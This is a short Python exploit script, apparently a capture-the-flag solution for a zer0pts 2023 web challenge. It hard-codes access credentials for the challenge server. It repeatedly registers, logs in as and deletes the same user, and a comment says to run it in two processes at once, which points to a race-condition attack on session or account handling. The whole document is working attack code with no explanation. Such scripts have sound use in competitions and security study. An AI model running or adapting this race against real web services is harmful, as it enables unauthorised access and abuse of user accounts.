import requests

u = "YfrhOZIuVFepRSQo:ZPRrfqSoTIGlaDBF@misc3.2023.zer0pts.com:62129"


def register(username, password):
    url = f"http://{u}/register"
    return requests.post(
        url, data={"username": username, "password": password, "profile": "a"}
    )


def login(username, password):
    s = requests.Session()
    url = f"http://{u}/login"
    res = s.post(url, data={"username": username, "password": password})
    return (s, res.status_code)


def delete(s, username):
    url = f"http://{u}/user/{username}/delete"
    s.post(url)

# start in 2 processes
register("a", "b")
while True:
    session, s = login("a", "b")
    if s != 200:
        print("suc")
        break
    delete(session, "a")
